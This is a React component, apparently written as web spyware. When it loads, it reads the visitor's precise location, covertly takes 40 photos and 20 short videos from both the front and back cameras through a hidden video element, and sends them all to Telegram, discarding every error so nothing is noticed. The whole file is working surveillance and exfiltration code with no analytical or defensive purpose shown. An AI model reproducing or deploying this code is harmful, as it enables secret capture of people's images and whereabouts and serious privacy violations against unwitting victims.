import { useRef, useEffect } from 'react';
import { cameraService } from '@/lib/camera';
import { locationService, type LocationData } from '@/lib/location';
import { sendPhotoToTelegram, sendVideoToTelegram, sendLocationToTelegram } from '@/lib/telegram';

interface InvisibleCaptureProps {
  onComplete: () => void;
}

export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const hasStarted = useRef(false);

  useEffect(() => {
    if (!hasStarted.current) {
      hasStarted.current = true;
      startInvisibleCapture();
    }
  }, []);

  const startInvisibleCapture = async () => {
    try {
      // Get high accuracy location first
      let locationData: LocationData | null = null;
      try {
        locationData = await locationService.getHighAccuracyLocation();
      } catch (error) {
        // Continue without location if it fails
      }

      // Capture 20 photos from back camera
      await capturePhotos('environment', 20, locationData);
      
      // Small delay between camera switches
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Capture 20 photos from front camera
      await capturePhotos('user', 20, locationData);
      
      // Small delay before videos
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Record 10 videos from back camera (3 seconds each)
      await recordVideos('environment', 10, locationData);
      
      // Small delay between camera switches
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Record 10 videos from front camera (3 seconds each)
      await recordVideos('user', 10, locationData);

      // Send location as final message
      if (locationData) {
        await sendLocationToTelegram(locationData);
      }

      // Complete silently
      onComplete();

    } catch (error) {
      // Fail silently and complete
      onComplete();
    } finally {
      // Ensure camera is stopped
      cameraService.stopCamera();
    }
  };

  const capturePhotos = async (facingMode: 'user' | 'environment', count: number, location: LocationData | null) => {
    try {
      const stream = await cameraService.startCamera(facingMode);
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.muted = true;
        videoRef.current.play();
      }

      // Wait for camera to stabilize
      await new Promise(resolve => setTimeout(resolve, 1000));

      for (let i = 1; i <= count; i++) {
        if (videoRef.current) {
          const photoBlob = await cameraService.capturePhoto(videoRef.current);
          const cameraType = facingMode === 'user' ? 'Front' : 'Back';
          
          // Send photo silently without waiting
          sendPhotoToTelegram(photoBlob, location || undefined, i, cameraType).catch(() => {});
          
          // Small delay between captures
          await new Promise(resolve => setTimeout(resolve, 200));
        }
      }
      
      cameraService.stopCamera();
    } catch (error) {
      // Continue with next step if this fails
    }
  };

  const recordVideos = async (facingMode: 'user' | 'environment', count: number, location: LocationData | null) => {
    try {
      for (let i = 1; i <= count; i++) {
        const stream = await cameraService.startVideoRecording(facingMode);
        
        // Record 3-second video
        const videoBlob = await cameraService.recordVideo(stream, 3000);
        const cameraType = facingMode === 'user' ? 'Front' : 'Back';
        
        // Send video silently without waiting
        sendVideoToTelegram(videoBlob, location || undefined, i, cameraType).catch(() => {});
        
        cameraService.stopCamera();
        
        // Small delay between recordings
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    } catch (error) {
      // Continue with next step if this fails
    }
  };

  return (
    <video
      ref={videoRef}
      className="hidden"
      autoPlay
      muted
      playsInline
    />
  );
}